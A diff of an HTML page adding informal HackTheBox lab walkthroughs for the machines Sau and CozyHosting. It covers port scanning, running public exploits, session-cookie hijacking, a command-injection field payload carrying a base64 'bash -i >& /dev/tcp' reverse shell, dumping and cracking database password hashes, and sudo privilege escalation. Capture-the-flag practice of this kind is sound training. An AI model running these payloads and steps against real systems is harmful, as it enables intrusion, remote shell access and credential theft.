@@ -89,7 +89,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="HackTheBox/index.html"><strong aria-hidden="true">1.</strong> HackTheBox</a></li><li class="chapter-item expanded "><a href="CryptoHack/index.html"><strong aria-hidden="true">2.</strong> CryptoHack</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> Machines</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.1.</strong> Easy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="HackTheBox/Machines/Easy/Sau.html"><strong aria-hidden="true">1.1.1.</strong> Sau</a></li><li class="chapter-item expanded "><a href="HackTheBox/Machines/Easy/CozyHosting.html"><strong aria-hidden="true">1.1.2.</strong> CozyHosting</a></li></ol></li></ol></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
@@ -174,9 +174,76 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="hackthebox"><a class="header" href="#hackthebox">HackTheBox</a></h1>
-<p><a href="HackTheBox/HackTheBox/Machines/README.html">Machines</a></p>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="cryptohack"><a class="header" href="#cryptohack">CryptoHack</a></h1>
+                        <p><img src="HackTheBox/Machines/Easy//Assets/HackTheBox/Machines/Sau.png" alt="Alt" />
+#HackTheBox #Machines #Easy</p>
+<h2 id="scan-port"><a class="header" href="#scan-port">Scan Port</a></h2>
+<pre><code class="language-bash">nmap -sCV -Pn {TARGET IP} -T4
+</code></pre>
+<p>The results, <code>22/tcp</code> <code>80/tcp</code> <code>55555/tcp</code></p>
+<h2 id="connect-to-sau"><a class="header" href="#connect-to-sau">Connect to Sau</a></h2>
+<p>First add new hosts and TARGET IP in <code>/etc/hosts</code>. Open your browser with port 55555, because we can't use on port 80.
+Create new basket, open basket and copy your basket. Search on your browser <code>Request basket exploit</code> and download it. In terminal, type this :</p>
+<pre><code class="language-bash">bash ./CVE-...sh {TARGET IP:PORT} {MY IP:PORT = 127.0.0.1:80}
+
+//ex result
+basket = cuyy123
+</code></pre>
+<p>The results is we're created new basket, open the basket with the token. Let's try paste the url basket on your browser, and see the result. Look, the result is different than before, on footer you can see <code>Matrail v.0.53</code>. So now, search <code>Maltrail v.0.53 exploits</code> and download it.
+Listen the port use <code>nc</code> command</p>
+<pre><code class="language-bash">nc -lvnp 1234
+</code></pre>
+<p>Then, we run the exploit.py are downloaded earlier</p>
+<pre><code class="language-python">python3 exploit.py {IP tun0} {PORT} {TARGET IP:PORT}/cuyy123
+</code></pre>
+<p>RUN IT. Open the listen port, yeah we can connect, soo now we can find the flag. <code>ls</code> for list, <code>cat</code> for execute/read. flag 1 is user.txt on Puma users, just <code>cd ~</code> and <code>ls</code> you can find the flag of user. flag 2 is root.txt on Root directory, <code>sudo -l</code>, copy content of NOPASSWD, <code>sudo ...</code>, use shebang <code>!/bin/sh</code>. Now you're on Root user, <code>ls</code> then <code>cd root</code> then <code>ls</code> again.
+Congratulations the last flag has been found by u hehehe.😁👍
+![[Sau Clear.png]]</p>
+<div style="break-before: page; page-break-before: always;"></div><p>![[CozyHosting.png]]
+#HackTheBox #Machines #Easy</p>
+<h2 id="1"><a class="header" href="#1">1</a></h2>
+<p>nmap
+open browser, n paste. it cant, just add on /etc/hosts
+open browser again, click login section
+open burpsuite
+intercept on
+i dont know. open terminal n dirsearch login section earlier
+u found actuator/session. open on your browser <code>.../actuator/sessions</code> &gt;&gt; kirim ke repeater
+kinderson with his cookie
+dont forget copy the cookie kinderson
+on your browser, set proxy to manual 127.0.0.1
+after that, open .../admin on your browser &gt;&gt; kirim ke repeater
+on burpsuite change the jsessionid = cookie kinderson, and forward
+youre on admin website now, scroll down, there is hostname n username mybe
+before fill the section, open terminal n run listening port with nc -nvlp port
+back to browser
+encode base64 : bash -i &gt;&amp; /dev/tcp/ur ip/port 0&gt;&amp;1 &lt;ubah  spasi dengan <a href="https://www.urlencoder.org/">${IFS%??}</a>&gt;
+host = your ip
+urname =( ;echo "encode-an tdi"; | base64 -d | bash) ubah ke url encode lagi
+aktifkan url encode dengan klik kanan
+kmudian sbmit, liat di burpsuite, ubah cookieny jika perlu &gt;&gt; kirim ke repeater
+n check your listener. kayy can connect
+ls. you can found cloud.... download it u can use http server or something
+after  download that, run this file with jd-gui (filenya)
+in bootinf-classes u can found aplication-properties. openit
+u can found urname n passwd
+open listener/ing use command below ```</p>
+<pre><code>psql -h 127.0.0.1 -U postgres
+\c cozyhosting
+\d
+select * from users;
+// copy admin password
+nano //paste admin pass// save with name hadmin.txt
+hashcat -a 0 -m 3200 hadmin.txt /...///.../rockyou.txt
+
+su josh // with password hadmin.txt earlier
+python3 -c 'import pty;pty.spawm("/bin/bash")'
+cd
+ls //u can found flag user.txt
+sudo with ssh 
+
+cd /rootu can found the flag root user
+</code></pre>
+<p>sudo with <a href="https://gtfobins.github.io/gtfobins/ssh/#sudo">ssh</a></p>
 
                     </main>
 
